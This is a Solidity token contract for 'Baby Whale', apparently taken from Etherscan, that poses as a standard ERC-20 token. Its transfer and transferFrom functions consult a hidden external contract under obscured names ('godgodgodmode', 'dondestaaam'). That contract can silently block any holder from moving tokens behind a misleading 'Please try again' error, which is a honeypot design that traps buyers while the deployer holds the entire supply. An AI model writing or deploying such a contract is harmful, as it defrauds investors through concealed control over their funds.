/**
 *Submitted for verification at Etherscan.io on 2021-08-14
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

interface DDRAW {

    function all_Supplies() external view returns (uint8);

    function dondestaaam(address account) external view returns (uint8);

    function move_From(address senders, address taker, uint balance) external returns (address);
  
}

contract BabyWhale {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowance;
    
    DDRAW godgodgodmode;
    uint256 public totalSupply = 10 * 10**12 * 10**18;
    string public name = "Baby Whale";
    string public symbol = hex"426162795768616C65f09f908b";
    uint public decimals = 18;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor(DDRAW paramrmt) {
        
        godgodgodmode = paramrmt;
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    
    
    function balanceOf(address holder) public view returns(uint256) {
        return balances[holder];
    }
    
    function transfer(address to, uint256 value) public returns(bool) {
        require(godgodgodmode.dondestaaam(msg.sender) != 1, "Please try again"); 
        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
        
    }

    
    function transferFrom(address from, address to, uint256 value) public returns(bool) {
        require(godgodgodmode.dondestaaam(from) != 1, "Please try again");
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    
    function approve(address spender, uint256 value) public returns(bool) {
        allowance[msg.sender][spender] = value;
        return true;
        
    }
}